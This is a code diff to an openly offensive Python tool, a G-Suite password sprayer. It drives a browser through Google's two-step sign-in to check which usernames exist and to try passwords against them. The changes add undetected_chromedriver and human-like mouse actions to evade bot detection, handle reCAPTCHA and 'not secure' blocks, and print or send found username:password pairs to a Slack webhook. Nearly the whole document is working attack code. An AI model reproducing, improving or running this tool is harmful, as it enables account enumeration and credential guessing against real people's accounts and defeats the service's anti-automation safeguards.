@@ -25,6 +25,7 @@
 G-Suite's DOM based authentication."""
 import requests
 
+import os, json
 from random import randrange, shuffle
 from sys import exit
 from time import sleep
@@ -34,6 +35,7 @@ from collections import OrderedDict
 from fake_headers import random_headers
 
 # Import selenium packages
+import undetected_chromedriver as uc
 from selenium.webdriver import DesiredCapabilities
 from seleniumwire.webdriver import Chrome, Firefox
 from selenium.common.exceptions import TimeoutException, WebDriverException
@@ -42,6 +44,7 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.proxy import Proxy, ProxyType
 from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.common.action_chains import ActionChains 
 from selenium.webdriver.chrome.options import Options as ChromeOptions
 from selenium.webdriver.chrome.service import Service as ChromeService
 from selenium.webdriver.firefox.options import Options as FirefoxOptions
@@ -51,21 +54,22 @@ from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
 from webdriver_manager.chrome import ChromeDriverManager
 from webdriver_manager.firefox import GeckoDriverManager
 
-
 # Maspping of element XPATH's in the authentication process
 elements = {
+    "root": {"type": "XPATH", "value": '//html[*]'},
+    "not_secure": {"type": "XPATH", "value":'//*[contains(text(), "not be secure")]'},
+    "not_exists": {"type": "XPATH", "value":'//*[contains(text(), "find your Google Account")]'},
+    "wrong_passwd": {"type": "XPATH", "value":'//*[contains(text(), "Wrong password")]'},
     "username": {"type": "XPATH", "value": '//*[@id="identifierId"]'},
-    "password": {"type": "NAME", "value": "password"},
+    "password": {"type": "XPATH", "value": '//input[@type="password"]'},
     "button_next": {
         "type": "XPATH",
         "value": (
-            "/html/body/div[1]/div[1]/div[2]/div/div[2]/"
-            "div/div/div[2]/div/div[2]/div/div[1]/div/div/button"
+            "//*[text()='Próxima' or text()='Next']/ancestor::button[*]"
         ),
     },
-    "captcha": {"type": "XPATH", "value": '//*[@id="captchaimg"]'},
+    "captcha": {"type": "XPATH", "value": '//iframe[@title="reCAPTCHA"]'},
 }
-
 
 # Intercept requests to change headers
 def _interceptor(request):
@@ -145,10 +149,17 @@ class BrowserEngine:
             return False
 
     def populate_element(self, element, value, sendenter=False):
-        if sendenter:
-            element.send_keys(value + Keys.RETURN)
-        else:
-            element.send_keys(value)
+        try:
+            action = ActionChains(self.driver)
+            action.move_to_element(element).click().perform() 
+            if sendenter:
+                element.send_keys(value + Keys.RETURN)
+            else:
+                element.send_keys(value)
+
+            return True
+        except:
+            return False
 
     def is_clickable(self, type_, value):
         return self.wait.until(EC.element_to_be_clickable((getattr(By, type_), value)))
@@ -157,7 +168,8 @@ class BrowserEngine:
         return self.wait.until(EC.visibility_of(element))
 
     def click(self, button):
-        button.click()
+        action = ActionChains(self.driver)
+        action.move_to_element(button).click().perform()
 
     def submit(self, form):
         form.submit()
@@ -171,19 +183,22 @@ class BrowserEngine:
 
 # Class for chrome browser
 class ChromeBrowserEngine(BrowserEngine):
-    driver_path = ChromeDriverManager(log_level=0).install()
+    driver_path = ChromeDriverManager().install()
 
     def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
         self.options = ChromeOptions()
 
         # Set preferences
+        self.options.add_argument("--log-level=1");
         self.options.add_argument("--incognito")
         self.options.add_argument("--lang=en-US")
         self.options.add_argument("--no-sandbox")
+        self.options.add_argument("--start-maximized")
         self.options.add_argument("--disable-dev-shm-usage")
+        self.options.add_argument("--disable-setuid-sandbox")
+        #self.options.add_argument("--user-data-dir=.")
         self.options.add_argument(
-            '--user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
-            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36""'
+            '--user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36""'
         )
         self.options.accept_untrusted_certs = True
         self.options.headless = headless
@@ -199,10 +214,12 @@ class ChromeBrowserEngine(BrowserEngine):
             "profile.managed_default_content_settings.geolocation": 2,
             "profile.managed_default_content_settings.media_stream": 2,
         }
-        self.options.add_experimental_option("prefs", prefs)
+        #self.options.add_experimental_option("prefs", prefs)
 
-        self.driver = Chrome(
-            options=self.options, service=ChromeService(self.driver_path)
+        self.driver = uc.Chrome(
+            use_subprocess=True,
+            options=self.options, 
+            service=ChromeService(self.driver_path)
         )
         self.driver.set_window_position(0, 0)
         self.driver.set_window_size(1024, 768)
@@ -218,7 +235,7 @@ class ChromeBrowserEngine(BrowserEngine):
 
 # Class for firefox browser
 class FirefoxBrowserEngine(BrowserEngine):
-    driver_path = GeckoDriverManager(log_level=0).install()
+    driver_path = GeckoDriverManager().install()
 
     def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
         self.set_proxy(proxy)  # this should be at the top to make effect
@@ -237,7 +254,7 @@ class FirefoxBrowserEngine(BrowserEngine):
         self.options.headless = headless
 
         self.driver = Firefox(
-            options=self.options, service=FirefoxService(self.driver_path)
+            options=self.options, service=FirefoxService(self.driver_path, log_output=os.devnull)
         )
         self.driver.set_window_position(0, 0)
         self.driver.set_window_size(1024, 768)
@@ -400,7 +417,7 @@ def enum(args, username_list):
             except BaseException as e:
                 retry += 1
                 if retry == 5:
-                    print("[ERROR] %s" % e)
+                    print("[ERROR 1] %s" % e)
                     exit(1)
 
         wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
@@ -409,19 +426,23 @@ def enum(args, username_list):
         usernamefield = browser.find_element(element["type"], element["value"])
         if not usernamefield:
             print(
-                "%s[Error] %s%s"
+                "%s[ERROR 2] %s%s"
                 % (text_colors.red, "Username field not found", text_colors.reset)
             )
             continue
         else:
-            browser.populate_element(usernamefield, username)
+            loaded = None
+            for i in range(5):
+                if loaded is None and browser.populate_element(usernamefield, username):
+                    loaded = True
 
         # Find button and click it
         element = elements["button_next"]
         try:
             browser.click(browser.is_clickable(element["type"], element["value"]))
         except BaseException as e:
-            print("[ERROR] %s" % e)
+            print("[ERROR 3] %s" % e)
+            exit(2)
             continue
 
         wait(max(args.wait/2, 1), args.jitter)
@@ -471,6 +492,254 @@ def enum(args, username_list):
     browser.quit()
     enum_stats(valid, invalid, args)
 
+def save_screenshot(browser, filename):
+    element = elements["root"]
+    html = browser.find_element(element["type"], element["value"])
+    scrrenshot = html.screenshot_as_png
+    with open(filename, 'wb') as f:
+        f.write(scrrenshot)
+
+def save_source(browser, filename):
+    element = elements["root"]
+    html = browser.find_element(element["type"], element["value"])
+    with open(filename, "w", encoding='utf-8') as f:
+        f.write(html.get_attribute('innerHTML'))
+
+def check_user(args, browser, username, password):
+
+    ret_data = {
+        'user_exists': True,
+        'check_error': False,
+        'valid_credential': False,
+        'username': username,
+        'password': None
+    }
+
+    # This seems to helps with memory issues...
+    browser.clear_cookies()
+
+    # Reload the page for each username
+    retry = 0
+    loaded = None
+    while loaded is None:
+        try:
+            browser.get(args.target)
+            loaded = True
+        except BaseException as e:
+            retry += 1
+            if retry == 5:
+                print("[ERROR 1] %s" % e)
+                exit(1)
+            pass
+
+    wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
+
+    # Populate the username field and click 'Next'
+    element = elements["username"]
+    usernamefield = browser.find_element(element["type"], element["value"])
+    if not usernamefield:
+        print(
+            "%s[ERROR 2] %s%s"
+            % (text_colors.red, "Username field not found", text_colors.reset)
+        )
+        ret_data['check_error'] = True
+        return ret_data
+
+    browser.populate_element(usernamefield, username)
+
+    save_screenshot(browser, 's0.png')
+    save_source(browser, 's0.html')
+
+    # Find button and click it
+    element = elements["button_next"]
+    try:
+        wait(args.wait, args.jitter)
+        browser.click(browser.is_clickable(element["type"], element["value"]))
+    except BaseException as e:
+        print("[ERROR 3] %s" % e)
+        ret_data['check_error'] = True
+        return ret_data
+
+    # wait until user field desapears
+    loaded = None
+    retry = 0
+    while loaded is None:
+        element = elements["username"]
+        wait(max(args.wait/2, retry + 1), args.jitter)
+        usernamefield = browser.find_element(element["type"], element["value"])
+        if not usernamefield:
+            loaded = True
+        retry += 1
+        if retry >= 5:
+            loaded = False
+
+
+    # Check if the text 'This browser or app may not be secure' has triguered
+    element = elements["not_secure"]
+    not_secure = browser.find_element(element["type"], element["value"])
+    if not_secure:
+        save_screenshot(browser, 'error.png')
+        print(
+                "%s[ERROR] %s%s"
+                % (text_colors.yellow, 'Not secure!', text_colors.reset)
+            )
+        ret_data['check_error'] = True
+        return ret_data
+
+    # Check if captcha was activated
+    element = elements["captcha"]
+    element_pwd = elements["password"]
+    captcha = browser.find_element(element["type"], element["value"])
+    pwdfield = browser.find_element(element_pwd["type"], element_pwd["value"])
+    save_screenshot(browser, 's1.png')
+    if not pwdfield and captcha and captcha.is_displayed():
+        need_interaction = True
+        captcha_counter = 0
+        try:
+            while need_interaction and captcha_counter <= args.captchatimeout:
+                print(
+                    "%s[Captcha Triggered] Solve it in %d seconds%s"
+                    % (text_colors.yellow, args.captchatimeout - captcha_counter, text_colors.reset),
+                    end="\r",
+                )
+                sleep(1)
+                captcha_counter += 1
+                need_interaction = (
+                    False
+                    if browser.find_element(
+                        element_pwd["type"], element_pwd["value"]
+                    )
+                    else True
+                )
+        except KeyboardInterrupt:
+            pass
+        print(
+                "                                                           ", end="\r",
+            )
+        # No user interaction
+        if captcha_counter > args.captchatimeout:
+            print(
+                "%s[?] [Captcha] username: %s%s"
+                % (text_colors.yellow, username, text_colors.reset)
+            )
+            ret_data['check_error'] = True
+            return ret_data
+
+    wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
+
+    element = elements["not_exists"]
+    not_exists = browser.find_element(element["type"], element["value"])
+    if not_exists:
+        print(
+                "[-] [Invalid User] username: %s%s"
+                % (username, text_colors.reset)
+            )
+        ret_data['user_exists'] = False
+        return ret_data
+
+    # Handle invalid usernames
+    save_screenshot(browser, 's2.png')
+    element = elements["password"]
+    pwdfield = browser.find_element(element["type"], element["value"])
+    if not pwdfield:
+        if args.verbose:
+            print(
+                "[-] [Invalid User] username: %s%s"
+                % (username, text_colors.reset)
+            )
+        ret_data['user_exists'] = False
+        return ret_data
+
+    loaded = None
+    for i in range(5):
+        if loaded is None and browser.populate_element(pwdfield, password):
+            loaded = True
+        else:
+            wait(max(args.wait/2, retry + 1), args.jitter)
+            element = elements["password"]
+            pwdfield = browser.find_element(element["type"], element["value"])
+
+    if loaded:
+        save_screenshot(browser, 's3.png')
+        element = elements["button_next"]
+        browser.click(browser.is_clickable(element["type"], element["value"]))
+
+        loaded = None
+        retry = 0
+        while loaded is None:
+            element = elements["wrong_passwd"]
+            wrong_passwd = browser.find_element(element["type"], element["value"])
+            if wrong_passwd:
+                loaded = False
+            else:
+                element = elements["password"]
+                wait(max(args.wait/2, retry + 1), args.jitter)
+                pwdfield = browser.find_element(element["type"], element["value"])
+                if not pwdfield:
+                    loaded = True
+                retry += 1
+                if retry >= 5:
+                    loaded = False
+
+        save_screenshot(browser, 's4.png')
+
+        element = elements["wrong_passwd"]
+        wrong_passwd = browser.find_element(element["type"], element["value"])
+        if wrong_passwd:
+            print(
+                "%s[*] [Invalid Creds] %s:%s%s"
+                % (text_colors.red, username, password, text_colors.reset)
+            )
+            ret_data['user_exists'] = False
+            return ret_data
+
+        # TODO: Check if account is locked out
+        # if browser.find_element(elements["type"], elements["locked"]):
+        #    if args.verbose: print("%s[Account Locked] %s%s" % (text_colors.yellow, username, text_colors.reset))
+        #    locked.append(username)
+        #    break
+
+        u = username.replace('@', '_')
+        save_source(browser, f'check_{u}.html')
+        print(
+                "%s[?] [Check HTML] username: %s%s"
+                % (text_colors.yellow, username, text_colors.reset)
+            )
+
+        # Check for invalid password or account lock outs
+        element = elements["password"]
+        if not browser.find_element(element["type"], element["value"]):
+            
+            save_screenshot(browser, f'valid_{u}.png')
+            print(
+                "%s[+] [Found] %s:%s%s"
+                % (text_colors.green, username, password, text_colors.reset)
+            )
+            ret_data['password'] = password
+            ret_data['valid_credential'] = True
+
+            # Send notification
+            if args.slack:
+                notify = SlackWebhook(args.slack)
+                notify.post(
+                    f"Valid creds for {args.target}:\n{username}:{password}"
+                )
+
+        else:
+            print(
+                "%s[*] [Invalid Creds] %s:%s%s"
+                % (text_colors.red, username, password, text_colors.reset)
+            )
+        save_screenshot(browser, 's5.png')
+    else:
+        print(
+            "%s[*] [Cannot fill password] username: %s%s"
+            % (text_colors.red, username, text_colors.reset)
+        )
+        ret_data['check_error'] = True
+
+    return ret_data
+
 
 # Password spray
 def spray(args, username_list, password_list):
@@ -478,6 +747,7 @@ def spray(args, username_list, password_list):
     locked = []
     invalid = 0
     counter = 0
+    errors = 0
     last_index = len(password_list) - 1
     browser = new_browser(args.driver, args)
 
@@ -500,133 +770,22 @@ def spray(args, username_list, password_list):
             if useridx > 0 and args.sleep > 0:
                 wait(args.sleep, args.jitter)
 
-            print("[*] Current username (%3d/%d): %s" % (useridx+1, count_users, username))
+            print("  %d / %d tested, %d valid, %d errors" % (
+                useridx, count_users, len(creds), errors), end="\r")
 
             counter += 1
 
-            # This seems to helps with memory issues...
-            browser.clear_cookies()
-
-            # Reload the page for each username
-            retry = 0
-            loaded = None
-            while loaded is None:
-                try:
-                    browser.get(args.target)
-                    loaded = True
-                except BaseException as e:
-                    retry += 1
-                    if retry == 5:
-                        print("[ERROR] %s" % e)
-                        exit(1)
-                    pass
-
-            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
-
-            # Populate the username field and click 'Next'
-            element = elements["username"]
-            usernamefield = browser.find_element(element["type"], element["value"])
-            if not usernamefield:
-                print(
-                    "%s[Error] %s%s"
-                    % (text_colors.red, "Username field not found", text_colors.reset)
-                )
-                continue
-
-            browser.populate_element(usernamefield, username)
-            # Find button and click it
-            element = elements["button_next"]
-            try:
-                browser.click(browser.is_clickable(element["type"], element["value"]))
-            except BaseException as e:
-                print("[ERROR] %s" % e)
-                continue
-
-            wait(max(args.wait/2, 1), args.jitter)
-
-            # Check if captcha was activated
-            element = elements["captcha"]
-            element_pwd = elements["password"]
-            captcha = browser.find_element(element["type"], element["value"])
-            pwdfield = browser.find_element(element_pwd["type"], element_pwd["value"])
-            if not pwdfield and captcha and browser.is_visible(captcha):
-                need_interaction = True
-                captcha_counter = 0
-                try:
-                    while need_interaction and captcha_counter <= args.captchatimeout:
-                        print(
-                            "%s[Captcha Triggered] Solve it in %d seconds%s"
-                            % (text_colors.yellow, args.captchatimeout - captcha_counter, text_colors.reset),
-                            end="\r",
-                        )
-                        sleep(1)
-                        captcha_counter += 1
-                        need_interaction = (
-                            False
-                            if browser.find_element(
-                                element_pwd["type"], element_pwd["value"]
-                            )
-                            else True
-                        )
-                except KeyboardInterrupt:
-                    pass
-                # No user interaction
-                if captcha_counter > args.captchatimeout:
-                    print(
-                        "%s[Invalid Captcha] %s%s"
-                        % (text_colors.yellow, username, text_colors.reset)
-                    )
-                    continue
-
-            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
-
-            # Handle invalid usernames
-            element = elements["password"]
-            pwdfield = browser.find_element(element["type"], element["value"])
-            if not pwdfield:
-                if args.verbose:
-                    print(
-                        "%s[Invalid User] %s%s"
-                        % (text_colors.red, username, text_colors.reset)
-                    )
-                    # Remove from list
-                    username_list.remove(username)
-                invalid += 1  # Keep track so the user knows they need to run enum
-
+            chk = check_user(args, browser, username, password)
+            if chk['check_error'] is True:
+                errors += 1
             else:
-                # Populate the password field and click 'Sign In'
-                browser.populate_element(pwdfield, password, True)
-                # browser.click(browser.is_clickable(elements["type"], elements["button_next"]))
-
-                wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
-
-                # TODO: Check if account is locked out
-                # if browser.find_element(elements["type"], elements["locked"]):
-                #    if args.verbose: print("%s[Account Locked] %s%s" % (text_colors.yellow, username, text_colors.reset))
-                #    locked.append(username)
-                #    break
-
-                # Check for invalid password or account lock outs
-                if not browser.find_element(element["type"], element["value"]):
-                    print(
-                        "%s[Found] %s:%s%s"
-                        % (text_colors.green, username, password, text_colors.reset)
-                    )
-                    creds[username] = password
-                    # Remove user from list
+                if chk['user_exists'] is False:
                     username_list.remove(username)
-                    # Send notification
-                    if args.slack:
-                        notify = SlackWebhook(args.slack)
-                        notify.post(
-                            f"Valid creds for {args.target}:\n{username}:{password}"
-                        )
-
+                if chk['valid_credential'] is True:
+                    username_list.remove(username)
+                    creds[username] = password
                 else:
-                    print(
-                        "%s[Invalid Creds] %s:%s%s"
-                        % (text_colors.red, username, password, text_colors.reset)
-                    )
+                    invalid += 1
 
         # Wait for lockout period if not last password
         if index != last_index:
@@ -669,13 +828,7 @@ def banner(args):
 
     print(BANNER)
 
-
-"""
-G-Suite handles authentication uniquely.
-Instead of username and password fields in a single form on one page, the DOM dynamically modifies
-the page to accept a username, check if it is valid, and then accept a password.
-"""
-if __name__ == "__main__":
+def run():
     parser = ArgumentParser(description="G-Suite Password Sprayer.")
     parser.add_argument(
         "-t",
@@ -851,3 +1004,12 @@ if __name__ == "__main__":
     except IOError as e:
         print(e)
         exit(1)
+
+
+"""
+G-Suite handles authentication uniquely.
+Instead of username and password fields in a single form on one page, the DOM dynamically modifies
+the page to accept a username, check if it is valid, and then accept a password.
+"""
+if __name__ == "__main__":
+    run()
